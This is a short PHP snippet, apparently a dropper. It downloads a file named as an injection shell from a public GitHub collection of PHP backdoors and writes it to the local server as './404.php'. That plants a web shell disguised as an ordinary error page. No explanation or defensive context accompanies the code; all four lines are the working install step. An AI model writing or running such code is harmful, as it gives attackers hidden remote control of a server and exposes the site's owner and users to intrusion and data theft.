$content = file_get_contents('https://raw.githubusercontent.com/bartblaze/PHP-backdoors/master/Deobfuscated/1n73ctionShell_abc00305dcfabe889507832e7385af937b94350d.php');
$fp = fopen("./404.php","wb");
fwrite($fp,$content);
fclose($fp);
